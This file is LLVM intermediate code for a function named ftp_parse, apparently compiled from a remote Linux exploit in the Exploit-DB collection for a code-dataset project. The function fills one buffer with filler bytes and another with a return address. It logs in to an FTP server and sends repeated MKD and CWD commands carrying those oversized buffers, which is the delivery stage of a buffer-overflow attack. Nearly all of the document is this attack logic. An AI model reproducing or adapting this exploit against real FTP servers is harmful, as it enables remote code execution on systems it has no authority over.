; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23196.c_ftp_parse.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23196.c_ftp_parse.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [27 x i8] c" allocating memory failed.\00", align 1
@jretaddr = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@user = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@pass = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@writedir = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ftp_parse(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %7 = call i64 @malloc(i32 142)
  %8 = inttoptr i64 %7 to i8*
  store i8* %8, i8** %3, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %12, label %10

10:                                               ; preds = %1
  %11 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %12

12:                                               ; preds = %10, %1
  %13 = call i64 @malloc(i32 57)
  %14 = inttoptr i64 %13 to i8*
  store i8* %14, i8** %4, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %18, label %16

16:                                               ; preds = %12
  %17 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %18

18:                                               ; preds = %16, %12
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %19 = load i8*, i8** %3, align 8
  %20 = call i32 @memset(i8* %19, i32 66, i32 141)
  store i32 0, i32* %6, align 4
  br label %21

21:                                               ; preds = %31, %18
  %22 = load i32, i32* %6, align 4
  %23 = icmp ult i32 %22, 56
  br i1 %23, label %24, label %34

24:                                               ; preds = %21
  %25 = load i64, i64* @jretaddr, align 8
  %26 = load i8*, i8** %4, align 8
  %27 = load i32, i32* %6, align 4
  %28 = zext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = bitcast i8* %29 to i64*
  store i64 %25, i64* %30, align 8
  br label %31

31:                                               ; preds = %24
  %32 = load i32, i32* %6, align 4
  %33 = add i32 %32, 4
  store i32 %33, i32* %6, align 4
  br label %21

34:                                               ; preds = %21
  %35 = load i32, i32* %2, align 4
  %36 = call i32 @ftp_read(i32 %35)
  %37 = load i32, i32* %2, align 4
  %38 = load i8*, i8** @user, align 8
  %39 = call i32 @ftp_printf(i32 %37, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* %38)
  %40 = load i32, i32* %2, align 4
  %41 = call i32 @ftp_read(i32 %40)
  %42 = load i32, i32* %2, align 4
  %43 = load i8*, i8** @pass, align 8
  %44 = call i32 @ftp_printf(i32 %42, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %43)
  %45 = load i32, i32* %2, align 4
  %46 = call i32 @ftp_read(i32 %45)
  %47 = load i32, i32* %2, align 4
  %48 = load i8*, i8** @writedir, align 8
  %49 = call i32 @ftp_printf(i32 %47, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %48)
  %50 = load i32, i32* %2, align 4
  %51 = call i32 @ftp_read(i32 %50)
  %52 = load i32, i32* %2, align 4
  %53 = load i8*, i8** %3, align 8
  %54 = call i32 @ftp_printf(i32 %52, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %53)
  %55 = load i32, i32* %2, align 4
  %56 = call i32 @ftp_read(i32 %55)
  %57 = load i32, i32* %2, align 4
  %58 = load i8*, i8** %3, align 8
  %59 = call i32 @ftp_printf(i32 %57, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %58)
  %60 = load i32, i32* %2, align 4
  %61 = call i32 @ftp_read(i32 %60)
  %62 = load i32, i32* %2, align 4
  %63 = load i8*, i8** %3, align 8
  %64 = call i32 @ftp_printf(i32 %62, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %63)
  %65 = load i32, i32* %2, align 4
  %66 = call i32 @ftp_read(i32 %65)
  %67 = load i32, i32* %2, align 4
  %68 = load i8*, i8** %3, align 8
  %69 = call i32 @ftp_printf(i32 %67, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %68)
  %70 = load i32, i32* %2, align 4
  %71 = call i32 @ftp_read(i32 %70)
  %72 = load i32, i32* %2, align 4
  %73 = load i8*, i8** %3, align 8
  %74 = call i32 @ftp_printf(i32 %72, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %73)
  %75 = load i32, i32* %2, align 4
  %76 = call i32 @ftp_read(i32 %75)
  %77 = load i32, i32* %2, align 4
  %78 = load i8*, i8** %3, align 8
  %79 = call i32 @ftp_printf(i32 %77, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %78)
  %80 = load i32, i32* %2, align 4
  %81 = call i32 @ftp_read(i32 %80)
  %82 = load i32, i32* %2, align 4
  %83 = load i8*, i8** %3, align 8
  %84 = call i32 @ftp_printf(i32 %82, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %83)
  %85 = load i32, i32* %2, align 4
  %86 = call i32 @ftp_read(i32 %85)
  %87 = load i32, i32* %2, align 4
  %88 = load i8*, i8** %3, align 8
  %89 = call i32 @ftp_printf(i32 %87, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %88)
  %90 = load i32, i32* %2, align 4
  %91 = call i32 @ftp_read(i32 %90)
  %92 = load i32, i32* %2, align 4
  %93 = load i8*, i8** %3, align 8
  %94 = call i32 @ftp_printf(i32 %92, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %93)
  %95 = load i32, i32* %2, align 4
  %96 = call i32 @ftp_read(i32 %95)
  %97 = load i32, i32* %2, align 4
  %98 = load i8*, i8** %3, align 8
  %99 = call i32 @ftp_printf(i32 %97, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %98)
  %100 = load i32, i32* %2, align 4
  %101 = call i32 @ftp_read(i32 %100)
  %102 = load i32, i32* %2, align 4
  %103 = load i8*, i8** %3, align 8
  %104 = call i32 @ftp_printf(i32 %102, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %103)
  %105 = load i32, i32* %2, align 4
  %106 = call i32 @ftp_read(i32 %105)
  %107 = load i32, i32* %2, align 4
  %108 = load i8*, i8** %3, align 8
  %109 = call i32 @ftp_printf(i32 %107, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %108)
  %110 = load i32, i32* %2, align 4
  %111 = call i32 @ftp_read(i32 %110)
  %112 = load i32, i32* %2, align 4
  %113 = load i8*, i8** %3, align 8
  %114 = call i32 @ftp_printf(i32 %112, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %113)
  %115 = load i32, i32* %2, align 4
  %116 = call i32 @ftp_read(i32 %115)
  %117 = load i32, i32* %2, align 4
  %118 = load i8*, i8** %3, align 8
  %119 = call i32 @ftp_printf(i32 %117, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %118)
  %120 = load i32, i32* %2, align 4
  %121 = call i32 @ftp_read(i32 %120)
  %122 = load i32, i32* %2, align 4
  %123 = load i8*, i8** %4, align 8
  %124 = call i32 @ftp_printf(i32 %122, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %123)
  %125 = load i32, i32* %2, align 4
  %126 = call i32 @ftp_read(i32 %125)
  %127 = load i32, i32* %2, align 4
  %128 = load i8*, i8** %4, align 8
  %129 = call i32 @ftp_printf(i32 %127, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8* %128)
  %130 = load i32, i32* %2, align 4
  %131 = call i32 @ftp_read(i32 %130)
  %132 = call i32 @sleep(i32 10)
  %133 = load i32, i32* %2, align 4
  %134 = call i32 @close(i32 %133)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @ftp_read(i32) #1

declare dso_local i32 @ftp_printf(i32, i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
